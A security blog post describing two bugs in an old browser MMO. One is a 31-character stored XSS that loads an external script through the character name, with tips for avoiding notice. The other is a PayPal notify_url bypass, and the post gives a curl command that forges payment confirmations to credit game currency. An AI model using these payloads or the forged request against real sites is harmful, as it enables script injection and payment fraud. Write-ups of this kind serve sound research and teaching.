---
layout: post
title: Finding Vulnerabilities in an 18 Year Old MMO
description: >-
    Finding and abusing size constrained XSS and a payment gateway bypass in an 18 year old MMO.
tags: Browser Exploits XXS Payment-Gateway Paypal Game
toc: true
published: true
---

## Introduction

I have notified the owner of the site, however, these bugs are still not fixed and are of low priority for such an old game of less than 100 active players. Thus, I will describe these vulnerabilities in a way that does not expose the website.

For context, this situation involved a text based browser game that plays like an MMO, allowing for multiple players to game in a shared environment. [Google Images: text based browser mmo](https://www.google.com/search?q=text+based+browser+mmo&tbm=isch) will give a general idea of the GUI of this class of game.

They look something like this:

![text based mmo example](/assets/posts/2021-11-12-Finding-Vulnerabilities-in-an-18-Year-Old-MMO/2021-11-12-15-08-07.png)

While there were several bugs found around the site, the two most interesting that provided a great learning experience for me were: (Bug 1) a limited character XSS and (Bug 2) a Paypal gateway bypass.

## Bug 1: Limited Character XSS

While there were a few places for XSS on the site, there was one particular page with a limited character XSS of **31** characters.

An external XXS payload was needed, which required a domain to be registered as a hardcoded IP address would produce too long of a payload.

> Interesting Note: IP addresses can also be represented as hex, this is often seen in malware for obfuscation. So an IP address of 222.13.12.122 (length: 13) can be represented as 0xde0d0c7a (length: 10). This is still too long for my use case, but still noteworthy if you are trying to shorten an IP by a few characters. 
>
> [browserling](https://www.browserling.com/tools/ip-to-hex) is a nice webtool to do a conversion if you'd like to test it yourself.



<p class="codeblock-label">The final payload would look something like this (31 characters):</p>

![final payload](/assets/posts/2021-11-12-Finding-Vulnerabilities-in-an-18-Year-Old-MMO/2021-11-12-15-14-22.png)

A few notes on this payload:
1. The <span style='color: orange'>A</span> at the beginning is not required for the payload to work, it is there so the spot on the page where the payload is rendered doesn't look suspiciously blank. In this case, it was the character name, so without the prefixed 'A' a list of characters would have yielded one with no name; this would look strange and may prompt others to investigate.
2. The <span style='color: red'>do6.us</span> is my malicious domain, I will discuss how I landed on that below.
3. The trailing `</script>` is not required for the payload to work if the page has a `</script>` tag somewhere later in the page, however, not using it will result in a potentially large portion of the page to not load correctly. This would prompt an investigation and we are trying to be subtle here. I will also elaborate on this below as well.
4. Note that using the `//` domain will use the current protocol for the user, so if they are viewing webapges in https, you must ensure your payload is hosted with a valid ssl certificate. 

### Domain Name: do6.us

#### Unicode vs. ASCII

There are some great articles about shortening XSS payloads such as [marektoth](https://marektoth.com/blog/xss-20-chars/) that include registering unicode domains. The important note is that these unicode characters still require several bytes of data to be stored by the client application. As an example, take the `℡㏛` domain mentioned in the article. Encoded using `encodeURIComponent()` results in a URL encoded result of `%E2%84%A1%E3%8F%9B`. So, "2" character sequence actually takes a whopping 7 bytes to be stored in the backend database.

This can be shown when viewing how the data is reflected in my limited character space.

<p class="codeblock-label">Character Name: ASCII A's Sequence</p>

Character Name Input: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

As shown in XSS affected page:
![A's](/assets/posts/2021-11-12-Finding-Vulnerabilities-in-an-18-Year-Old-MMO/2021-11-12-14-59-55.png)


<p class="codeblock-label">Character Name: ℡㏛'s Sequence</p>

Character Name Input: "℡㏛℡㏛℡㏛℡㏛℡㏛℡㏛℡㏛℡㏛℡㏛℡㏛℡㏛℡㏛℡㏛℡㏛℡㏛℡㏛"

As shown in XSS affected page:
![℡㏛](/assets/posts/2021-11-12-Finding-Vulnerabilities-in-an-18-Year-Old-MMO/2021-11-12-15-31-40.png)

As you can see, in a 31 character limited space, not even 3 iterations of this "2" character sequence are shown. This makes sense as the database is storing 7 bytes for each character sequence instead of the 1 byte for the ASCII 'A'. But wait, 7*3 is 21, so why aren't more iterations displayed?

Well, going back to edit my character name shows me some interesting output. My current name is displayed as:
```text
&#8481;&#13275;&#8481;&#13275;&
```

![31 characters](/assets/posts/2021-11-12-Finding-Vulnerabilities-in-an-18-Year-Old-MMO/2021-11-12-15-42-23.png)

Which is 31 characters, meaning even the prefix `&#` and suffex `;` to represent each unicode character counts towards the total length. 

#### Registering do6.us

There isn't much to tell here. Since unicode takes multiple bytes, I figure a domain with 2-3 characters of ASCII was suitable for my needs. I essentially wrote a script using the Godaddy API (not recomended, the free API rate limit thresholds are crazy low for this use case) for all 2 character domains looking for generalized prices. After noting `.us` was a pretty cheap domain, I wrote a script to iterate for all 2-3 character domains (as 1 character ASCII domains are usually very expensive). 

`do6.us` was available for a reasonable `$2.37`.

Another perk of this is that there are no crazy unicode characters that act weird in different applications or have to be converted using [punycode](https://en.wikipedia.org/wiki/Punycode). For now, this will seem to work, perhaps there are other situations where a single unicode character will work better? 

### Trailing </script> Tag

As mentioned above, the closing `</script>` tag on the final payload `A<script> src=//do6.us></script>` is not technically required. That said, I would like to demonstrate what would occur if it is removed. 

Below is a test.html page representing the XSS Injection point.

**With Trailing </script> Tag in payload**

![with trailing tag](/assets/posts/2021-11-12-Finding-Vulnerabilities-in-an-18-Year-Old-MMO/2021-11-12-16-19-05.png)

Number in image above:
1. Injected XSS - with trailing `</script>` tag
2. Page content is still displayed in affected XSS page after rendering.

    ![with trailing tag - after](/assets/posts/2021-11-12-Finding-Vulnerabilities-in-an-18-Year-Old-MMO/2021-11-12-16-23-21.png)

3. Last script tag is **NOT** required for this payload. 


**Without Trailing </script> Tag in payload**


![without trailing tag](/assets/posts/2021-11-12-Finding-Vulnerabilities-in-an-18-Year-Old-MMO/2021-11-12-16-28-57.png)

I have highlighted the portion of the HTML that gets consumed by the non-closed `<script>` tag.

Number in image above:
1. Injected XSS - without trailing `</script>` tag
2. Page content below XSS injection point is no longer displayed in affected XSS page after rendering.

    ![without trailing tag - after](/assets/posts/2021-11-12-Finding-Vulnerabilities-in-an-18-Year-Old-MMO/2021-11-12-16-26-48.png)

    As seen in the browser developer tools, the page content has been cannabalized by our payload with a non-closed `<script>` tag.

    ![without trailing tag - browser html](/assets/posts/2021-11-12-Finding-Vulnerabilities-in-an-18-Year-Old-MMO/2021-11-12-16-30-03.png)

3. Last script tag is **IS** required for this payload

I should note that even a payload of `<script src=https://do6.us/>` (trailing `/>`) yields the same rendering results.

In this example only a single line was not shown in the rendered page source for the non-closed `<script>` payload. However, if the XSS injection point is high enough in the page, this behavior can result in the majority of page content disappearing and is a massive red flag to anyone that views the page. For stealth, adding the trailing `</script>` tag in the XSS payload is preferrable. 

If a payload without a closing `</script>` tag is required due to more extreme size constraints; there may be ways to clean up the page after the javascript has been executed, for example, by appending this to the XSS external payload:

```javascript
var script = document.querySelector('[src="https://do6.us"]')
script.parentElement.insertAdjacentHTML('beforeend', script.innerHTML);
```

However, this will only re-add content, the cannabalized script `<script>/* some javascript stuff */</script>` will not execute, this may be ok, or the page may still be broken depending on the situation. In addition, this payload would have to be modified as it assumes it places content at the end of the documennt - if the consumed `<script>` was not the last DOM object, this "fix" will result in a mangled page.

In the end, it's much less trouble (and noticable) if you can afford to just append `</script>` to the initial XSS payload, as I was able to do.


## Bug 2: Paypal Gateway Bypass

This game had a means of purchasing in game items using real dollars. A paypal portal was set up, and once purchased, the game would credit your account with whatever you bought.

At first, I tried to just buy something for $.01 and see how much the game would credit my account. Since Paypal relays how much is actually paid, this resulted in my account only being credited $.01. So I moved onto another, more fruitful, experiement. 

### Paypal's 'notify_url' parameter

When checking out with paypal on the site, a `POST` request is made to paypal with the folling parameters (other parameters/headers have been removed for clarity):

![paypal parameters](/assets/posts/2021-11-12-Finding-Vulnerabilities-in-an-18-Year-Old-MMO/2021-11-12-17-54-44.png)

Of note:
1. `os0` = my account's user_id (which account will be credited with the purchase)
2. `notify_url` = This tells Paypal where to send the confirmation message of a successful payment.

In this case, I replaced the `notify_url` with my own server to capture the "confirmed" payment response, similar to [webook.site](https://webhook.site/). In essense, when a purchase is made, paypal will think it needs to notify my malicious server that the payment is complete. In this way, I now see exactly what parameters are being passed to the original notify_url of `http://www.business.url/confirm_payment.php` from paypal.

In this instance, I catch a request from paypal with a whopping **46** parameters to confirm the payment. These parameters include payment details and other such metadata. 

### Paypal Always Sends Shipping Address Info?

An interesting note that I did not consider previously is that paypal sent my shipping address even though this purchase was not for an item to be shipped! This makes me a little nervous and more weary of "promotions" on networking sites that ask for a payment of $1 for some technically relavent .pdf. 

Moving forward I will be leveraging services like [privacy.com](https://privacy.com/) even for small purchases as to not disclose not only my name or physical address to random companies (or potentially data collectors or other nefarious parties). 

### Infinite Monies

So, to continue on, I then sent a POST request to `http://www.business.url/confirm_payment.php` with the 46 parameters and my account was credited. They do not validate that the request came from paypal.com and there is no signature validation! 

After some tinkering, I parsed the payload down to something like this. In an attempt to trim the personal data and keep the request as clean as possible.

```text
curl -XPOST http://www.business.url/confirm_payment.php -d 'mc_gross=500.00&payment_status=Completed&option_selection1=76543&mc_currency=USD&item_number=business-1&receipt_id=1234-5678-9101-2131'
```

Where: 
- `mc_gross` = amount paid
- `option_selection1` = is my username
- `receipt_id` = GUID (I changed my original GUID and the payment was still processed)

Each time this POST request is sent, my account is credited $500. Easy peasy. 

## Conclusion

I learned a lot from this experience for both shortening XSS payloads and looking at how the Paypal gateway operates. I wrote to the owner of the game and suggested some remediation steps. Overall, this was super fun and hopefully these learnings can be used by someone else out there in a positive way.

Cheers!
